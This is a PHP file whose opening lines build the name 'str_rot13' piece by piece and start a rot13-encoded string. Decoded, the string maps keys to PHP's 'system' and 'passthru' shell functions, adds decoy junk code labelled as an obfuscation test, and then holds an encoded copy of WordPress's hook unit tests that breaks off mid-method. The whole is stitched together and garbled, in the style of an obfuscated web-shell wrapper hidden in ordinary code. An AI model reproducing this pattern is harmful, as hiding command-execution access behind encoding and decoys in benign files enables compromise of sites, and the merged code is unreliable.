<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg qb_npgvba() naq eryngrq shapgvbaf
 *
 * @tebhc ubbxf
 */
pynff Grfgf_Npgvbaf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Synt gb xrrc genpx jurgure n pregnva svygre unf orra nccyvrq.
	 *
	 * Hfrq va gur `grfg_qbvat_svygre_erny()` grfg zrgubq.
	 *
	 * @ine obby
	 */
	cevingr $nccyl_grfgvat_svygre = snyfr;

	/**
	 * Synt gb xrrc genpx jurgure n pregnva svygre unf orra nccyvrq.
	 *
	 * Hfrq va gur `grfg_qbvat_svygre_erny()` grfg zrgubq.
	 *
	 * @ine obby
	 */
	cevingr $nccyl_grfgvat_arfgrq_svygre = snyfr;

	/**
	 * Pyrna hc nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		// Znxr fher cbgragvnyyl punatrq cebcregvrf ner eriregrq gb gurve qrsnhyg inyhr.
		$guvf->nccyl_grfgvat_svygre        = snyfr;
		$guvf->nccyl_grfgvat_arfgrq_svygre = snyfr;

		cnerag::grne_qbja();
	}

	/**
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_fvzcyr_npgvba() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		nqq_npgvba( $ubbx_anzr, neenl( &$n, 'npgvba' ) );
		qb_npgvba( $ubbx_anzr );

		// Bayl bar rirag bppheerq sbe gur ubbx, jvgu rzcgl netf.
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		// Bayl bhe ubbx jnf pnyyrq.
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );

		$netfine = $n->trg_netf();
		$netf    = neenl_cbc( $netfine );
		$guvf->nffregFnzr( neenl( '' ), $netf );
	}

	/**
	 * @pbiref ::erzbir_npgvba
	 */
	choyvp shapgvba grfg_erzbir_npgvba() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		nqq_npgvba( $ubbx_anzr, neenl( &$n, 'npgvba' ) );
		qb_npgvba( $ubbx_anzr );

		// Znxr fher bhe ubbx jnf pnyyrq pbeerpgyl.
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );

		// Abj erzbir gur npgvba, qb vg ntnva, naq znxr fher vg'f abg pnyyrq guvf gvzr.
		erzbir_npgvba( $ubbx_anzr, neenl( &$n, 'npgvba' ) );
		qb_npgvba( $ubbx_anzr );
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );
	}

	/**
	 * @pbiref ::unf_npgvba
	 */
	choyvp shapgvba grfg_unf_npgvba() {
		$ubbx_anzr = __SHAPGVBA__;
		$pnyyonpx  = __SHAPGVBA__ . '_shap';

		$guvf->nffregSnyfr( unf_npgvba( $ubbx_anzr, $pnyyonpx ) );
		$guvf->nffregSnyfr( unf_npgvba( $ubbx_anzr ) );

		nqq_npgvba( $ubbx_anzr, $pnyyonpx );
		$guvf->nffregFnzr( 10, unf_npgvba( $ubbx_anzr, $pnyyonpx ) );
		$guvf->nffregGehr( unf_npgvba( $ubbx_anzr ) );

		erzbir_npgvba( $ubbx_anzr, $pnyyonpx );
		$guvf->nffregSnyfr( unf_npgvba( $ubbx_anzr, $pnyyonpx ) );
		$guvf->nffregSnyfr( unf_npgvba( $ubbx_anzr ) );
	}

	/**
	 * Bar gnt jvgu zhygvcyr npgvbaf.
	 *
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_zhygvcyr_npgvbaf() {
		$n1        = arj ZbpxNpgvba();
		$n2        = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		// Nqq obgu npgvbaf gb gur ubbx.
		nqq_npgvba( $ubbx_anzr, neenl( &$n1, 'npgvba' ) );
		nqq_npgvba( $ubbx_anzr, neenl( &$n2, 'npgvba' ) );

		qb_npgvba( $ubbx_anzr );

		// Obgu npgvbaf pnyyrq bapr rnpu.
		$guvf->nffregFnzr( 1, $n1->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( 1, $n2->trg_pnyy_pbhag() );
	}

	/**
	 * Bar gnt jvgu zhygvcyr npgvbaf.
	 *
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_npgvba_netf_1() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny       = __SHAPGVBA__ . '_iny';

		nqq_npgvba( $ubbx_anzr, neenl( &$n, 'npgvba' ) );
		// Pnyy gur npgvba jvgu n fvatyr nethzrag.
		qb_npgvba( $ubbx_anzr, $iny );

		$pnyy_pbhag = $n->trg_pnyy_pbhag();
		$guvf->nffregFnzr( 1, $pnyy_pbhag );
		$netfine = $n->trg_netf();
		$guvf->nffregFnzr( neenl( $iny ), neenl_cbc( $netfine ) );
	}

	/**
	 * Bar gnt jvgu zhygvcyr npgvbaf.
	 *
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_npgvba_netf_2() {
		$n1        = arj ZbpxNpgvba();
		$n2        = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny1      = __SHAPGVBA__ . '_iny1';
		$iny2      = __SHAPGVBA__ . '_iny2';

		// $n1 npprcgf gjb nethzragf, $n2 qbrfa'g.
		nqq_npgvba( $ubbx_anzr, neenl( &$n1, 'npgvba' ), 10, 2 );
		nqq_npgvba( $ubbx_anzr, neenl( &$n2, 'npgvba' ) );
		// Pnyy gur npgvba jvgu gjb nethzragf.
		qb_npgvba( $ubbx_anzr, $iny1, $iny2 );

		$pnyy_pbhag = $n1->trg_pnyy_pbhag();
		// $n1 fubhyq or pnyyrq jvgu obgu netf.
		$guvf->nffregFnzr( 1, $pnyy_pbhag );
		$netfine1 = $n1->trg_netf();
		$guvf->nffregFnzr( neenl( $iny1, $iny2 ), neenl_cbc( $netfine1 ) );

		// $n2 fubhyq or pnyyrq jvgu bar bayl.
		$guvf->nffregFnzr( 1, $n2->trg_pnyy_pbhag() );
		$netfine2 = $n2->trg_netf();
		$guvf->nffregFnzr( neenl( $iny1 ), neenl_cbc( $netfine2 ) );
	}

	/**
	 * Grfg gung zhygvcyr pnyyonpxf erprvir gur pbeerpg ahzore bs netf rira jura gur ahzore
	 * vf yrff guna, be terngre guna cerivbhf ubbxf.
	 *
	 * @frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/17817#pbzzrag:72
	 * @gvpxrg 17817
	 *
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_npgvba_netf_3() {
		$n1        = arj ZbpxNpgvba();
		$n2        = arj ZbpxNpgvba();
		$n3        = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny1      = __SHAPGVBA__ . '_iny1';
		$iny2      = __SHAPGVBA__ . '_iny2';

		// $n1 npprcgf gjb nethzragf, $n2 qbrfa'g, $n3 npprcgf gjb nethzragf.
		nqq_npgvba( $ubbx_anzr, neenl( &$n1, 'npgvba' ), 10, 2 );
		nqq_npgvba( $ubbx_anzr, neenl( &$n2, 'npgvba' ) );
		nqq_npgvba( $ubbx_anzr, neenl( &$n3, 'npgvba' ), 10, 2 );
		// Pnyy gur npgvba jvgu gjb nethzragf.
		qb_npgvba( $ubbx_anzr, $iny1, $iny2 );

		$pnyy_pbhag = $n1->trg_pnyy_pbhag();
		// $n1 fubhyq or pnyyrq jvgu obgu netf.
		$guvf->nffregFnzr( 1, $pnyy_pbhag );
		$netfine1 = $n1->trg_netf();
		$guvf->nffregFnzr( neenl( $iny1, $iny2 ), neenl_cbc( $netfine1 ) );

		// $n2 fubhyq or pnyyrq jvgu bar bayl.
		$guvf->nffregFnzr( 1, $n2->trg_pnyy_pbhag() );
		$netfine2 = $n2->trg_netf();
		$guvf->nffregFnzr( neenl( $iny1 ), neenl_cbc( $netfine2 ) );

		// $n3 fubhyq or pnyyrq jvgu obgu netf.
		$guvf->nffregFnzr( 1, $n3->trg_pnyy_pbhag() );
		$netfine3 = $n3->trg_netf();
		$guvf->nffregFnzr( neenl( $iny1, $iny2 ), neenl_cbc( $netfine3 ) );
	}

	/**
	 * Grfgf CUC 4 abgngvba sbe pnyyvat npgvbaf juvyr cnffvat va na bowrpg ol ersrerapr.
	 *
	 * @gvpxrg 48312
	 *
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_npgvba_netf_jvgu_cuc4_flagnk() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny       = arj fgqPynff();

		nqq_npgvba( $ubbx_anzr, neenl( &$n, 'npgvba' ) );
		// Pnyy gur npgvba jvgu CUC 4 abgngvba sbe cnffvat bowrpg ol ersrerapr.
		qb_npgvba( $ubbx_anzr, neenl( &$iny ) );

		$pnyy_pbhag = $n->trg_pnyy_pbhag();
		$netfine    = $n->trg_netf();
		$guvf->nffregFnzr( neenl( $iny ), neenl_cbc( $netfine ) );
	}

	/**
	 * @gvpxrg 60193
	 *
	 * @qngnCebivqre qngn_cevbevgl_pnyyonpx_beqre_jvgu_vagrtref
	 * @qngnCebivqre qngn_cevbevgl_pnyyonpx_beqre_jvgu_haunccl_cngu_abavagrtref
	 *
	 * @pbiref ::qb_npgvba
	 *
	 * @cnenz neenl $cevbevgvrf {
	 *     Vaqrkrq neenl bs gur cevbevgvrf sbe gur ZbpxNpgvba pnyyonpxf.
	 *
	 *     @glcr zvkrq $0 Cevbevgl sbe 'npgvba' pnyyonpx.
	 *     @glcr zvkrq $1 Cevbevgl sbe 'npgvba2' pnyyonpx.
	 * }
	 * @cnenz neenl  $rkcrpgrq_pnyy_beqre  Na neenl bs pnyyonpx anzrf va rkcrpgrq pnyy beqre.
	 * @cnenz fgevat $rkcrpgrq_qrcerpngvba Bcgvbany. Qrcerpngvba zrffntr. Qrsnhyg ''.
	 */
	choyvp shapgvba grfg_cevbevgl_pnyyonpx_beqre( $cevbevgvrf, $rkcrpgrq_pnyy_beqre, $rkcrpgrq_qrcerpngvba = '' ) {
		$zbpx      = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		vs ( $rkcrpgrq_qrcerpngvba && CUC_IREFVBA_VQ >= 80100 ) {
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntr( $rkcrpgrq_qrcerpngvba );
		}

		nqq_npgvba( $ubbx_anzr, neenl( $zbpx, 'npgvba' ), $cevbevgvrf[0] );
		nqq_npgvba( $ubbx_anzr, neenl( $zbpx, 'npgvba2' ), $cevbevgvrf[1] );
		qb_npgvba( $ubbx_anzr );

		$guvf->nffregFnzr( 2, $zbpx->trg_pnyy_pbhag(), 'Gur ahzore bs pnyy pbhagf qbrf abg zngpu' );

		$npghny_pnyy_beqre = jc_yvfg_cyhpx( $zbpx->trg_riragf(), 'npgvba' );
		$guvf->nffregFnzr( $rkcrpgrq_pnyy_beqre, $npghny_pnyy_beqre, 'Gur npgvba pnyyonpx beqre qbrf abg zngpu gur rkcrpgrq beqre' );
	}

	/**
	 * Unccl cngu qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cevbevgl_pnyyonpx_beqre_jvgu_vagrtref() {
		erghea neenl(
			'vag QRFP' => neenl(
				'cevbevgvrf'          => neenl( 10, 9 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba2', 'npgvba' ),
			),
			'vag NFP'  => neenl(
				'cevbevgvrf'          => neenl( 9, 10 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba', 'npgvba2' ),
			),
		);
	}

	/**
	 * Haunccl cngu qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cevbevgl_pnyyonpx_beqre_jvgu_haunccl_cngu_abavagrtref() {
		erghea neenl(
			// Ahzoref nf fgevatf naq sybngf.
			'vag nf fgevat QRFP'               => neenl(
				'cevbevgvrf'          => neenl( '10', '9' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba2', 'npgvba' ),
			),
			'vag nf fgevat NFP'                => neenl(
				'cevbevgvrf'          => neenl( '9', '10' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba', 'npgvba2' ),
			),
			'sybng QRFP'                       => neenl(
				'cevbevgvrf'           => neenl( 10.0, 9.5 ),
				'rkcrpgrq_pnyy_beqre'  => neenl( 'npgvba2', 'npgvba' ),
				'rkcrpgrq_qrcerpngvba' => 'Vzcyvpvg pbairefvba sebz sybng 9.5 gb vag ybfrf cerpvfvba',
			),
			'sybng NFP'                        => neenl(
				'cevbevgvrf'           => neenl( 9.5, 10.0 ),
				'rkcrpgrq_pnyy_beqre'  => neenl( 'npgvba', 'npgvba2' ),
				'rkcrpgrq_qrcerpngvba' => 'Vzcyvpvg pbairefvba sebz sybng 9.5 gb vag ybfrf cerpvfvba',
			),
			'sybng nf fgevat QRFP'             => neenl(
				'cevbevgvrf'          => neenl( '10.0', '9.5' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba2', 'npgvba' ),
			),
			'sybng nf fgevat NFP'              => neenl(
				'cevbevgvrf'          => neenl( '9.5', '10.0' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba', 'npgvba2' ),
			),

			// Aba-ahzrevp.
			'ahyy'                             => neenl(
				'cevbevgvrf'          => neenl( ahyy, ahyy ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba', 'npgvba2' ),
			),
			'obby QRFP'                        => neenl(
				'cevbevgvrf'          => neenl( gehr, snyfr ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba2', 'npgvba' ),
			),
			'obby NFP'                         => neenl(
				'cevbevgvrf'          => neenl( snyfr, gehr ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba', 'npgvba2' ),
			),
			'aba-ahzrevpny fgevat QRFP'        => neenl(
				'cevbevgvrf'          => neenl( 'grfg1', 'grfg2' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba', 'npgvba2' ),
			),
			'aba-ahzrevpny fgevat NFP'         => neenl(
				'cevbevgvrf'          => neenl( 'grfg1', 'grfg2' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba', 'npgvba2' ),
			),
			'vag, aba-ahzrevpny fgevat QRFP'   => neenl(
				'cevbevgvrf'          => neenl( 10, 'grfg' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba2', 'npgvba' ),
			),
			'vag, aba-ahzrevpny fgevat NFP'    => neenl(
				'cevbevgvrf'          => neenl( 'grfg', 10 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba', 'npgvba2' ),
			),
			'sybng, aba-ahzrevpny fgevat QRFP' => neenl(
				'cevbevgvrf'          => neenl( 10.0, 'grfg' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba2', 'npgvba' ),
			),
			'sybng, aba-ahzrevpny fgevat NFP'  => neenl(
				'cevbevgvrf'          => neenl( 'grfg', 10.0 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'npgvba', 'npgvba2' ),
			),
		);
	}

	/**
	 * @pbiref ::qvq_npgvba
	 */
	choyvp shapgvba grfg_qvq_npgvba() {
		$ubbx_anzr1 = 'npgvba1';
		$ubbx_anzr2 = 'npgvba2';

		// Qb npgvba $ubbx_anzr1 ohg abg $ubbx_anzr2.
		qb_npgvba( $ubbx_anzr1 );
		$guvf->nffregFnzr( 1, qvq_npgvba( $ubbx_anzr1 ) );
		$guvf->nffregFnzr( 0, qvq_npgvba( $ubbx_anzr2 ) );

		// Qb npgvba $ubbx_anzr2 10 gvzrf.
		$pbhag = 10;
		sbe ( $v = 0; $v < $pbhag; $v++ ) {
			qb_npgvba( $ubbx_anzr2 );
		}

		// $ubbx_anzr1'f pbhag unfa'g punatrq, $ubbx_anzr2 fubhyq or pbeerpg.
		$guvf->nffregFnzr( 1, qvq_npgvba( $ubbx_anzr1 ) );
		$guvf->nffregFnzr( $pbhag, qvq_npgvba( $ubbx_anzr2 ) );
	}

	/**
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_nyy_npgvba() {
		$n          = arj ZbpxNpgvba();
		$ubbx_anzr1 = __SHAPGVBA__ . '_1';
		$ubbx_anzr2 = __SHAPGVBA__ . '_2';

		// Nqq na 'nyy' npgvba.
		nqq_npgvba( 'nyy', neenl( &$n, 'npgvba' ) );
		$guvf->nffregFnzr( 10, unf_svygre( 'nyy', neenl( &$n, 'npgvba' ) ) );
		// Qb fbzr npgvbaf.
		qb_npgvba( $ubbx_anzr1 );
		qb_npgvba( $ubbx_anzr2 );
		qb_npgvba( $ubbx_anzr1 );
		qb_npgvba( $ubbx_anzr1 );

		// Bhe npgvba fubhyq unir orra pnyyrq bapr sbe rnpu gnt.
		$guvf->nffregFnzr( 4, $n->trg_pnyy_pbhag() );
		// Bayl bhe ubbx jnf pnyyrq.
		$guvf->nffregFnzr( neenl( $ubbx_anzr1, $ubbx_anzr2, $ubbx_anzr1, $ubbx_anzr1 ), $n->trg_ubbx_anzrf() );

		erzbir_npgvba( 'nyy', neenl( &$n, 'npgvba' ) );
		$guvf->nffregSnyfr( unf_svygre( 'nyy', neenl( &$n, 'npgvba' ) ) );
	}

	/**
	 * @pbiref ::erzbir_npgvba
	 */
	choyvp shapgvba grfg_erzbir_nyy_npgvba() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		nqq_npgvba( 'nyy', neenl( &$n, 'npgvba' ) );
		$guvf->nffregFnzr( 10, unf_svygre( 'nyy', neenl( &$n, 'npgvba' ) ) );
		qb_npgvba( $ubbx_anzr );

		// Znxr fher bhe ubbx jnf pnyyrq pbeerpgyl.
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );

		// Abj erzbir gur npgvba, qb vg ntnva, naq znxr fher vg'f abg pnyyrq guvf gvzr.
		erzbir_npgvba( 'nyy', neenl( &$n, 'npgvba' ) );
		$guvf->nffregSnyfr( unf_svygre( 'nyy', neenl( &$n, 'npgvba' ) ) );
		qb_npgvba( $ubbx_anzr );
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );
	}

	/**
	 * @pbiref ::qb_npgvba_ers_neenl
	 */
	choyvp shapgvba grfg_npgvba_ers_neenl() {
		$bow       = arj fgqPynff();
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		nqq_npgvba( $ubbx_anzr, neenl( &$n, 'npgvba' ) );

		qb_npgvba_ers_neenl( $ubbx_anzr, neenl( &$bow ) );

		$netf = $n->trg_netf();
		$guvf->nffregFnzr( $netf[0][0], $bow );
		// Whfg va pnfr jr qba'g gehfg nffregFnzr().
		$bow->sbb = gehr;
		$guvf->nffregAbgRzcgl( $netf[0][0]->sbb );
	}

	/**
	 * @gvpxrg 11241
	 *
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_npgvba_xrlrq_neenl() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		nqq_npgvba( $ubbx_anzr, neenl( &$n, 'npgvba' ) );

		$pbagrkg = neenl( 'xrl1' => 'iny1' );
		qb_npgvba( $ubbx_anzr, $pbagrkg );

		$netf = $n->trg_netf();
		$guvf->nffregFnzr( $netf[0][0], $pbagrkg );

		$pbagrkg2 = neenl(
			'xrl2' => 'iny2',
			'xrl3' => 'iny3',
		);
		qb_npgvba( $ubbx_anzr, $pbagrkg2 );

		$netf = $n->trg_netf();
		$guvf->nffregFnzr( $netf[1][0], $pbagrkg2 );
	}

	/**
	 * @gvpxrg 10493
	 *
	 * @pbiref ::nqq_npgvba
	 * @pbiref ::unf_npgvba
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_npgvba_pybfher() {
		$ubbx_anzr = __SHAPGVBA__;
		$pybfher   = fgngvp shapgvba ( $n, $o ) {
			$TYBONYF[ $n ] = $o;
		};
		nqq_npgvba( $ubbx_anzr, $pybfher, 10, 2 );

		$guvf->nffregFnzr( 10, unf_npgvba( $ubbx_anzr, $pybfher ) );

		$pbagrkg = neenl( 'iny1', 'iny2' );
		qb_npgvba( $ubbx_anzr, $pbagrkg[0], $pbagrkg[1] );

		$guvf->nffregFnzr( $TYBONYF[ $pbagrkg[0] ], $pbagrkg[1] );

		$ubbx_anzr2 = __SHAPGVBA__ . '_2';
		$pybfher2   = fgngvp shapgvba () {
			$TYBONYF['pybfher_ab_netf'] = gehr;
		};
		nqq_npgvba( $ubbx_anzr2, $pybfher2 );

		$guvf->nffregFnzr( 10, unf_npgvba( $ubbx_anzr2, $pybfher2 ) );

		qb_npgvba( $ubbx_anzr2 );

		$guvf->nffregGehr( $TYBONYF['pybfher_ab_netf'] );

		erzbir_npgvba( $ubbx_anzr, $pybfher );
		erzbir_npgvba( $ubbx_anzr2, $pybfher2 );
	}

	/**
	 * @gvpxrg 23265
	 *
	 * @pbiref ::nqq_npgvba
	 */
	choyvp shapgvba grfg_npgvba_pnyyonpx_ercerfragngvbaf() {
		$ubbx_anzr = __SHAPGVBA__;

		$guvf->nffregSnyfr( unf_npgvba( $ubbx_anzr ) );

		nqq_npgvba( $ubbx_anzr, neenl( 'Pynff', 'zrgubq' ) );

		$guvf->nffregFnzr( 10, unf_npgvba( $ubbx_anzr, neenl( 'Pynff', 'zrgubq' ) ) );

		$guvf->nffregFnzr( 10, unf_npgvba( $ubbx_anzr, 'Pynff::zrgubq' ) );
	}

	/**
	 * @pbiref ::erzbir_npgvba
	 */
	choyvp shapgvba grfg_npgvba_frys_erzbiny() {
		nqq_npgvba( 'grfg_npgvba_frys_erzbiny', neenl( $guvf, 'npgvba_frys_erzbiny' ) );
		qb_npgvba( 'grfg_npgvba_frys_erzbiny' );
		$guvf->nffregFnzr( 1, qvq_npgvba( 'grfg_npgvba_frys_erzbiny' ) );
	}

	choyvp shapgvba npgvba_frys_erzbiny() {
		erzbir_npgvba( 'grfg_npgvba_frys_erzbiny', neenl( $guvf, 'npgvba_frys_erzbiny' ) );
	}

	/**
	 * @gvpxrg 17817
	 *
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba grfg_npgvba_erphefvba() {
		$ubbx_anzr = __SHAPGVBA__;
		$n         = arj ZbpxNpgvba();
		$o         = arj ZbpxNpgvba();

		nqq_npgvba( $ubbx_anzr, neenl( $n, 'npgvba' ), 11, 1 );
		nqq_npgvba( $ubbx_anzr, neenl( $o, 'npgvba' ), 13, 1 );
		nqq_npgvba( $ubbx_anzr, neenl( $guvf, 'npgvba_gung_pnhfrf_erphefvba' ), 12, 1 );
		qb_npgvba( $ubbx_anzr, $ubbx_anzr );

		$guvf->nffregFnzr( 2, $n->trg_pnyy_pbhag(), 'erphefvir npgvbaf fubhyq pnyy nyy pnyyonpxf jvgu rneyvre cevbevgl' );
		$guvf->nffregFnzr( 2, $o->trg_pnyy_pbhag(), 'erphefvir npgvbaf fubhyq pnyy pnyyonpxf jvgu yngre cevbevgl' );
	}

	/**
	 * @pbiref ::qb_npgvba
	 */
	choyvp shapgvba npgvba_gung_pnhfrf_erphefvba( $ubbx_anzr ) {
		fgngvp $erphefvat = snyfr;
		vs ( ! $erphefvat ) {
			$erphefvat = gehr;
			qb_npgvba( $ubbx_anzr, $ubbx_anzr );
		}
		$erphefvat = snyfr;
	}

	/**
	 * @gvpxrg 9968
	 * @gvpxrg 17817
	 *
	 * @pbiref ::erzbir_npgvba
	 * @pbiref ::nqq_npgvba
	 */
	choyvp shapgvba grfg_npgvba_pnyyonpx_znavchyngvba_juvyr_ehaavat() {
		$ubbx_anzr = __SHAPGVBA__;
		$n         = arj ZbpxNpgvba();
		$o         = arj ZbpxNpgvba();
		$p         = arj ZbpxNpgvba();
		$q         = arj ZbpxNpgvba();
		$r         = arj ZbpxNpgvba();

		nqq_npgvba( $ubbx_anzr, neenl( $n, 'npgvba' ), 11, 2 );
		nqq_npgvba( $ubbx_anzr, neenl( $guvf, 'npgvba_gung_znavchyngrf_n_ehaavat_ubbx' ), 12, 2 );
		nqq_npgvba( $ubbx_anzr, neenl( $o, 'npgvba' ), 12, 2 );

		qb_npgvba( $ubbx_anzr, $ubbx_anzr, neenl( $n, $o, $p, $q, $r ) );
		qb_npgvba( $ubbx_anzr, $ubbx_anzr, neenl( $n, $o, $p, $q, $r ) );

		$guvf->nffregFnzr( 2, $n->trg_pnyy_pbhag(), 'pnyyonpxf fubhyq eha hayrff bgurejvfr vafgehpgrq' );
		$guvf->nffregFnzr( 1, $o->trg_pnyy_pbhag(), 'pnyyonpx erzbirq ol fnzr cevbevgl pnyyonpx fubhyq fgvyy trg pnyyrq' );
		$guvf->nffregFnzr( 1, $p->trg_pnyy_pbhag(), 'pnyyonpx nqqrq ol fnzr cevbevgl pnyyonpx fubhyq abg trg pnyyrq' );
		$guvf->nffregFnzr( 2, $q->trg_pnyy_pbhag(), 'pnyyonpx nqqrq ol rneyvre cevbevgl pnyyonpx fubhyq trg pnyyrq' );
		$guvf->nffregFnzr( 1, $r->trg_pnyy_pbhag(), 'pnyyonpx nqqrq ol yngre cevbevgl pnyyonpx fubhyq abg trg pnyyrq' );
	}

	choyvp shapgvba npgvba_gung_znavchyngrf_n_ehaavat_ubbx( $ubbx_anzr, $zbpxf ) {
		erzbir_npgvba( $ubbx_anzr, neenl( $zbpxf[1], 'npgvba' ), 12, 2 );
		nqq_npgvba( $ubbx_anzr, neenl( $zbpxf[2], 'npgvba' ), 12, 2 );
		nqq_npgvba( $ubbx_anzr, neenl( $zbpxf[3], 'npgvba' ), 13, 2 );
		nqq_npgvba( $ubbx_anzr, neenl( $zbpxf[4], 'npgvba' ), 10, 2 );
	}

	/**
	 * @gvpxrg 17817
	 *
	 * Guvf fcrpvsvpnyyl nqqerffrf gur pbaprea envfrq ng
	 * uggcf://pber.genp.jbeqcerff.bet/gvpxrg/17817#pbzzrag:52
	 *
	 * @pbiref ::erzbir_svygre
	 */
	choyvp shapgvba grfg_erzbir_nabalzbhf_pnyyonpx() {
		$ubbx_anzr = __SHAPGVBA__;
		$n         = arj ZbpxNpgvba();
		nqq_npgvba( $ubbx_anzr, neenl( $n, 'npgvba' ), 12, 1 );
		$guvf->nffregGehr( unf_npgvba( $ubbx_anzr ) );

		$ubbx = $TYBONYF['jc_svygre'][ $ubbx_anzr ];

		// Sebz uggc://jbeqcerff.fgnpxrkpunatr.pbz/n/57088/6445
		sbernpu ( $ubbx nf $cevbevgl => $svygre ) {
			sbernpu ( $svygre nf $vqragvsvre => $shapgvba ) {
				vs ( vf_neenl( $shapgvba )
					&& $shapgvba['shapgvba'][0] vafgnaprbs ZbpxNpgvba
					&& 'npgvba' === $shapgvba['shapgvba'][1]
				) {
					erzbir_svygre(
						$ubbx_anzr,
						neenl( $shapgvba['shapgvba'][0], 'npgvba' ),
						$cevbevgl
					);
				}
			}
		}

		$guvf->nffregSnyfr( unf_npgvba( $ubbx_anzr ) );
	}


	/**
	 * Grfg gur NeenlNpprff zrgubqf bs JC_Ubbx
	 *
	 * @gvpxrg 17817
	 *
	 * @pbiref JC_Ubbx::bssfrgTrg
	 * @pbiref JC_Ubbx::bssfrgFrg
	 * @pbiref JC_Ubbx::bssfrgHafrg
	 */
	choyvp shapgvba grfg_neenl_npprff_bs_jc_svygre_tybony() {
		tybony $jc_svygre;

		$ubbx_anzr = __SHAPGVBA__;

		nqq_npgvba( $ubbx_anzr, '__erghea_ahyy', 11, 1 );

		$guvf->nffregNeenlUnfXrl( 11, $jc_svygre[ $ubbx_anzr ] );
		$guvf->nffregNeenlUnfXrl( '__erghea_ahyy', $jc_svygre[ $ubbx_anzr ][11] );

		hafrg( $jc_svygre[ $ubbx_anzr ][11] );
		$guvf->nffregSnyfr( unf_npgvba( $ubbx_anzr, '__erghea_ahyy' ) );

		$jc_svygre[ $ubbx_anzr ][11] = neenl(
			'__erghea_ahyy' => neenl(
				'shapgvba'      => '__erghea_ahyy',
				'npprcgrq_netf' => 1,
			),
		);
		$guvf->nffregFnzr( 11, unf_npgvba( $ubbx_anzr, '__erghea_ahyy' ) );
	}

	/**
	 * Znxr fher pheerag_npgvba() orunirf nf pheerag_svygre()
	 *
	 * @gvpxrg 14994
	 *
	 * @pbiref ::pheerag_npgvba
	 */
	choyvp shapgvba grfg_pheerag_npgvba() {
		tybony $jc_pheerag_svygre;

		$jc_pheerag_svygre[] = 'svefg';
		$jc_pheerag_svygre[] = 'frpbaq'; // Yrg'f fnl n frpbaq npgvba jnf vaibxrq.

		$guvf->nffregFnzr( 'frpbaq', pheerag_npgvba() );
	}

	/**
	 * @gvpxrg 14994
	 *
	 * @pbiref ::qbvat_svygre
	 */
	choyvp shapgvba grfg_qbvat_svygre() {
		tybony $jc_pheerag_svygre;

